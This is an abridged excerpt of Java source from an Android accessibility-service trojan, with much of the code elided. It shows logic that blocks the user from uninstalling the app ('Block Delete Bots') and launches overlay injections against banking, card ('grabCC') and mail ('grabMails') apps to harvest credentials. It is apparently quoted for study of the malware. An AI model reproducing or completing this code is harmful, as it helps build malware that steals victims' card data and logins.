...
public class srvSccessibility extends AccessibilityService {
    ...
    public void onAccessibilityEvent(AccessibilityEvent event){
        ...
        try {
            ...
            app_inject = "";
            utl.Log(TAG_LOG, "Error #1 onAccessibilityEvent");
        }
        ...
        try {
            ...
            if ((AccessibilityEvent.TYPE_VIEW_SELECTED == event.getEventType() && (!utl.getScreenBoolean(this)))) {
                utl.Log(TAG_LOG, "click unlock device");
        ...
        try {
            if (AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED == event.getEventType()) {
                ...
                utl.Log(TAG_LOG, "packageApp{" + packageAppStart + "} strText{" + strText + "} className{" + className + "}");
       ...
       // Log.e("TTT",""+ event.toString());
        ...
        try {
            ...
            if(!utl.SettingsRead(this, consts.killApplication).equals(getPackageName())) {
                ...
                //--- Block Delete Bots ---
                if (((className.equals("android.support.v7.widget.recyclerview")) || (className.equals("android.widget.linearlayout")))
                        && ((event.getPackageName().toString().equals(consts.string_49)) ||(event.getPackageName().toString().equals("android.widget.linearlayout")))
                        && (strText.contains(utl.getLabelApplication(this).toLowerCase()))) {
         ...
         //   utl.SettingsToAdd(this, consts.LogSMS , consts.string_169 + ex.toString() + consts.string_119);
           ...
           //-------------Injection Application---------------------------------
                ...
                if (((!actionSettingInject.isEmpty()) && (actionSettingInject.contains(app_inject)) && (app_inject.contains(".") && (utl.getScreenBoolean(this))) ||
                        ((actionSettingInject.contains("grabCC")) && (consts.listAppGrabCards.contains(app_inject + ",")) && (app_inject.contains(".")) && (utl.getScreenBoolean(this))) ||
                        ((actionSettingInject.contains("grabMails")) && (consts.listAppGrabMails.contains(app_inject + ",")) && (app_inject.contains(".")) && (utl.getScreenBoolean(this)))) {
                   ...
                   String nameInject = consts.str_null;
                    ...
                    try {
                        ...
                        utl.Log(TAG_LOG, "ERROR Start Injection: " + app_inject + " " + ex);
                    }
            }
